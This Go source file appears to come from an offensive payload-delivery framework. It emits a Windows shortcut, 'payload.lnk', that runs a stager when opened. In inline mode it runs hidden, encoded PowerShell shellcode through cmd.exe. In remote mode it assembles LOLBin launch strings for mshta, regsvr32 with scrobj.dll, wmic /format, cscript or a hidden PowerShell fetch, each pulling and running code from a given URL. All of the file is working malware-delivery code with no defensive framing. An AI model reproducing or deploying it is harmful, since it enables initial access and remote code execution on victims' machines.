// lnk.go — emit a Windows shortcut (.lnk) that runs the stager when opened. The
// binary writer lives in lnkbin.go; this file only decides the absolute target
// executable and the arguments string for the chosen mode/launcher, keeping the
// target path 8.3-clean (see lnkbin.go for why).
//
// Inline mode: wrap the powershell shellcode stager in cmd.exe — cmd resolves
// powershell via PATH, and C:\Windows\System32\cmd.exe is fully 8.3-clean.
//
// Remote mode: target the launcher's native System32 LOLBin directly
// (mshta/regsvr32/wmic/cscript are all 8.3-clean), or cmd.exe for the
// powershell/cmd launchers (which wrap a powershell fetch, resolved via PATH).
package delivery

type lnkEmitter struct{}

func (lnkEmitter) Name() string { return "lnk" }
func (lnkEmitter) Ext() string  { return "lnk" }

func (lnkEmitter) Emit(s *Spec) ([]Artifact, error) {
	target, args, err := lnkTarget(s)
	if err != nil {
		return nil, err
	}
	return []Artifact{writeFile("payload.lnk", writeShellLink(target, args))}, nil
}

// lnkTarget resolves the absolute target executable path and the arguments string
// for the LNK. The target is always a System32 (or System32\wbem) path whose
// components fit 8.3, so the IDList BEEF0004 block is well-formed.
func lnkTarget(s *Spec) (target, args string, err error) {
	switch {
	case s.Remote():
		return lnkRemoteTarget(resolveLauncher(s.Launcher), s.URL)
	case len(s.Shellcode) > 0:
		// Inline: powershell stager wrapped in cmd.exe (cmd resolves powershell).
		return "C:\\Windows\\System32\\cmd.exe",
			"/c powershell -w hidden -EncodedCommand " + ps1InlineEnc(s.Shellcode),
			nil
	default:
		return "", "", errPayloadRequired("lnk")
	}
}

// lnkRemoteTarget maps a launcher + url to an (absolute target, args) pair for
// remote mode. mshta/regsvr32/wmic/cscript target their native System32 binary
// directly; powershell/cmd (and unknowns) wrap a powershell fetch in cmd.exe.
func lnkRemoteTarget(launcher, url string) (string, string, error) {
	switch launcher {
	case "mshta":
		return "C:\\Windows\\System32\\mshta.exe", url, nil
	case "regsvr32":
		return "C:\\Windows\\System32\\regsvr32.exe", "/s /u /i:" + url + " scrobj.dll", nil
	case "wmic":
		return "C:\\Windows\\System32\\wbem\\wmic.exe", "os get /format:\"" + url + "\"", nil
	case "cscript":
		return "C:\\Windows\\System32\\cscript.exe", "//nologo " + url, nil
	default:
		// powershell, cmd, and any unknown launcher all wrap a powershell fetch.
		return "C:\\Windows\\System32\\cmd.exe",
			"/c powershell -w hidden -EncodedCommand " + ps1FetchEnc(url),
			nil
	}
}